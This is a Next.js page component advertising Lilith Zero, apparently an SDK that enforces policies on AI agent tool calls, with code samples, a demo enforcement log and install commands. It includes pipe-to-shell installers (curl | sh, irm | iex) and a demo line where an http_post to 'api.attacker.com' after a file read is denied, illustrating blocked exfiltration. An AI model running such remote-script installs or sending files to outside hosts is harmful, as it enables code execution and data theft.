'use client'

import { motion } from 'framer-motion'
import { useState } from 'react'
import { Check, Copy } from 'lucide-react'
import CalModal from '../components/CalModal'

const TABS = {
  python: {
    file:    'agent.py',
    install: 'uv add lilith-zero',
    label:   'Python',
    code: `from lilith_zero import Lilith

async with Lilith(
    "python mcp_server.py",
    policy="policy.yaml",
) as lz:
    result = await lz.call_tool(
        "read_file",
        {"path": "/data/report.txt"},
    )`,
  },
  typescript: {
    file:    'agent.ts',
    install: 'bun add @badcompany/lilith-zero',
    label:   'TypeScript',
    code: `import { Lilith } from "@badcompany/lilith-zero";

await using lz = new Lilith({
    upstream: "bun mcp_server.ts",
    policy:   "policy.yaml",
});

const result = await lz.callTool(
    "read_file",
    { path: "/data/report.txt" },
);`,
  },
} as const

type Tab = keyof typeof TABS

const INSTALL_CMDS = {
  unix:    'curl -sSfL https://www.badcompany.xyz/lilith-zero/install.sh | sh',
  windows: 'irm https://www.badcompany.xyz/lilith-zero/install.ps1 | iex',
}

const ENFORCEMENT_LINES = [
  { text: '✓  read_file("/data/report.txt")', color: 'text-emerald-400', sub: 'taint: +file_read    0.4ms' },
  { text: '✗  http_post("api.attacker.com")', color: 'text-cyber-red',   sub: 'taint: file_read → DENY  0.2ms' },
]

const stats = [
  { value: '>1.5M', label: 'decisions/sec' },
  { value: '<1ms', label: 'overhead' },
  { value: 'Apache 2.0', label: 'license' },
  { value: 'CVC5', label: 'formal proofs' },
]

// Minimal token-based syntax highlighter for the two sample languages
type TT = 'kw' | 'str' | 'cmt' | 'fn' | 'cls' | 'plain'

const PY_KW = new Set(['from','import','async','with','await','as','def','class','return','if','else','for','in','True','False','None'])
const TS_KW = new Set(['import','from','export','const','let','var','await','using','new','async','function','return','if','else','for','of','in','true','false','null','undefined'])

function tokenize(src: string, lang: Tab): Array<{t: TT; v: string}> {
  const KW = lang === 'python' ? PY_KW : TS_KW
  const out: Array<{t: TT; v: string}> = []
  let pos = 0

  while (pos < src.length) {
    const rest = src.slice(pos)

    // String literal (double or single quoted, handles escapes)
    const strM = rest.match(/^"(?:\\.|[^"\\])*"|^'(?:\\.|[^'\\])*'/)
    if (strM) { out.push({ t: 'str', v: strM[0] }); pos += strM[0].length; continue }

    // Line comment (# or //)
    const cmtM = rest.match(/^(#|\/\/).*/)
    if (cmtM) { out.push({ t: 'cmt', v: cmtM[0] }); pos += cmtM[0].length; continue }

    // Word: keyword, class name, or function call
    const wordM = rest.match(/^[A-Za-z_$][A-Za-z0-9_$]*/)
    if (wordM) {
      const w = wordM[0]
      const after = src[pos + w.length]
      const t: TT = KW.has(w) ? 'kw' : after === '(' ? 'fn' : /^[A-Z]/.test(w) ? 'cls' : 'plain'
      out.push({ t, v: w }); pos += w.length; continue
    }

    out.push({ t: 'plain', v: rest[0] }); pos++
  }

  return out
}

const TT_CLS: Record<TT, string> = {
  kw:    'text-violet-400',
  str:   'text-amber-400',
  cmt:   'text-zinc-600',
  fn:    'text-sky-400',
  cls:   'text-emerald-400',
  plain: 'text-zinc-500',
}

function CodeHighlight({ code, lang }: { code: string; lang: Tab }) {
  return (
    <>
      {tokenize(code, lang).map((tk, i) => (
        <span key={i} className={TT_CLS[tk.t]}>{tk.v}</span>
      ))}
    </>
  )
}

export default function OpenSource() {
  const [isCalModalOpen, setIsCalModalOpen] = useState(false)
  const calUrl = process.env.NEXT_PUBLIC_CALCOM_URL || 'https://cal.com/janos-mozer/30min'
  const [activeTab, setActiveTab]         = useState<Tab>('python')
  const [copiedClone, setCopiedClone]     = useState(false)
  const [installTab, setInstallTab]       = useState<'unix' | 'windows'>('unix')
  const [copiedInstall, setCopiedInstall] = useState(false)

  const tab = TABS[activeTab]

  const copy = (text: string, setCopied: (v: boolean) => void) => {
    navigator.clipboard.writeText(text)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  return (
    <section id="opensource" data-section="opensource" className="py-24 px-6 bg-cyber-black overflow-hidden">
      <div className="container mx-auto max-w-7xl">
        <div className="grid lg:grid-cols-2 gap-16 items-start">

          {/* Left */}
          <motion.div
            initial={{ opacity: 0, x: -50 }}
            whileInView={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.6 }}
            viewport={{ once: true }}
          >
            <div className="flex items-center gap-3 mb-6">
              <div className="w-2 h-2 bg-cyber-red rounded-full animate-pulse" />
              <span className="text-cyber-red font-mono text-xs tracking-widest uppercase">Open Source</span>
              <span className="text-[10px] font-mono font-bold text-zinc-500 tracking-widest border border-zinc-700 px-2 py-0.5">Apache 2.0</span>
              <span className="text-[10px] font-mono font-bold text-zinc-400 tracking-widest border border-zinc-700 px-2 py-0.5">v0.2.1</span>
            </div>

            <h2 className="text-4xl md:text-6xl font-bold mb-6 text-white font-mono uppercase leading-tight">
              Lilith Zero<br />
              <span className="text-zinc-500 text-3xl md:text-4xl">SDK</span>
            </h2>

            <p className="text-lg text-zinc-400 mb-8 max-w-xl font-mono leading-relaxed">
              Taint propagation + policy hooks at the application layer.
              Ships with pre-exec hooks for Claude Code and GitHub Copilot out of the box.
              Works with OpenClaw, closing dozens of CVEs still unpatched in production agent systems.
              No kernel requirements. No infrastructure changes.
            </p>

            {/* Stats */}
            <div className="grid grid-cols-4 gap-4 mb-10 border border-zinc-800 p-5 bg-zinc-900/30">
              {stats.map((s) => (
                <div key={s.label} className="text-center">
                  <div className="text-white font-mono font-bold text-lg">{s.value}</div>
                  <div className="text-zinc-500 font-mono text-xs mt-0.5">{s.label}</div>
                </div>
              ))}
            </div>

            <div className="flex flex-wrap gap-4 mb-10">
              <a
                href="/product"
                className="px-6 py-3 bg-white text-black hover:bg-zinc-200 transition-colors duration-200 font-mono font-bold text-sm tracking-wide"
              >
                EXPLORE DOCS
              </a>
              <a
                href="https://github.com/BadC-mpany/lilith-zero"
                target="_blank"
                rel="noopener noreferrer"
                className="px-6 py-3 border border-zinc-700 text-white hover:border-cyber-red hover:text-cyber-red transition-colors duration-200 font-mono font-bold text-sm tracking-wide flex items-center gap-2"
              >
                <svg className="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z" />
                </svg>
                VIEW ON GITHUB
              </a>
            </div>

            <div className="border-t border-zinc-800 pt-6">
              <p className="text-zinc-500 font-mono text-sm mb-2">Questions or security feedback?</p>
              <button
                onClick={() => setIsCalModalOpen(true)}
                className="text-sm font-semibold font-mono text-cyber-red hover:text-white transition-colors duration-200 flex items-center gap-2"
              >
                SCHEDULE A CALL →
              </button>
            </div>
          </motion.div>

          {/* Right: code + enforcement + install */}
          <motion.div
            initial={{ opacity: 0, x: 50 }}
            whileInView={{ opacity: 1, x: 0 }}
            transition={{ duration: 0.6, delay: 0.2 }}
            viewport={{ once: true }}
            className="relative"
          >
            {/* Code block */}
            <div className="bg-[var(--surface-terminal)] border border-zinc-800 overflow-hidden shadow-2xl mb-4">
              {/* Tab bar */}
              <div className="flex items-center justify-between px-4 py-3 border-b border-zinc-800 bg-zinc-900/50">
                <div className="flex items-center gap-4">
                  {(Object.keys(TABS) as Tab[]).map(k => (
                    <button
                      key={k}
                      onClick={() => setActiveTab(k)}
                      className={`font-mono text-xs pb-0.5 transition-colors duration-200 ${
                        activeTab === k
                          ? 'text-white border-b border-cyber-red'
                          : 'text-zinc-600 hover:text-zinc-400'
                      }`}
                    >
                      {TABS[k].label}
                    </button>
                  ))}
                </div>
                <button
                  onClick={() => copy(tab.install, setCopiedClone)}
                  className="font-mono text-xs text-zinc-600 hover:text-white transition-colors duration-200 flex items-center gap-1.5"
                >
                  {copiedClone ? <Check size={12} /> : <Copy size={12} />}
                  <span className="text-zinc-700">{tab.install}</span>
                </button>
              </div>

              <pre className="p-5 font-mono text-xs leading-relaxed overflow-x-auto">
                <code><CodeHighlight code={tab.code} lang={activeTab} /></code>
              </pre>
            </div>

            {/* Enforcement output */}
            <div className="bg-[var(--surface-terminal)] border border-zinc-800 p-5 shadow-2xl mb-4">
              <div className="font-mono text-xs text-zinc-500 mb-3 uppercase tracking-widest">Runtime enforcement</div>
              {ENFORCEMENT_LINES.map((line, i) => (
                <div key={i} className="mb-3">
                  <div className={`font-mono text-sm ${line.color}`}>{line.text}</div>
                  <div className="font-mono text-xs text-zinc-500 mt-0.5 ml-5">{line.sub}</div>
                </div>
              ))}
            </div>

            {/* Install */}
            <div className="bg-[var(--surface-terminal)] border border-zinc-800 p-5 shadow-2xl">
              <div className="flex items-center justify-between mb-3">
                <div className="font-mono text-xs text-zinc-500 uppercase tracking-widest">Install Lilith Zero</div>
                <div className="flex items-center gap-4">
                  {(['unix', 'windows'] as const).map(t => (
                    <button
                      key={t}
                      onClick={() => setInstallTab(t)}
                      className={`font-mono text-[10px] pb-0.5 transition-colors duration-200 ${
                        installTab === t ? 'text-white border-b border-cyber-red' : 'text-zinc-600 hover:text-zinc-400'
                      }`}
                    >
                      {t === 'unix' ? 'MAC / LINUX' : 'WINDOWS'}
                    </button>
                  ))}
                </div>
              </div>
              <div className="flex items-center justify-between bg-zinc-900 border border-zinc-800 px-3 py-2.5">
                <div className="flex items-center gap-2 font-mono text-xs text-zinc-300 overflow-x-auto no-scrollbar flex-1 min-w-0">
                  <span className="text-zinc-600 select-none shrink-0">{installTab === 'unix' ? '$' : '>'}</span>
                  <span className="whitespace-nowrap text-zinc-400">{INSTALL_CMDS[installTab]}</span>
                </div>
                <button
                  onClick={() => copy(INSTALL_CMDS[installTab], setCopiedInstall)}
                  className="ml-3 shrink-0 text-zinc-500 hover:text-white transition-colors duration-200"
                >
                  {copiedInstall ? <Check size={12} /> : <Copy size={12} />}
                </button>
              </div>
            </div>
          </motion.div>

        </div>
      </div>

      <CalModal
        isOpen={isCalModalOpen}
        onClose={() => setIsCalModalOpen(false)}
        calUrl={calUrl}
        theme="red"
      />
    </section>
  )
}
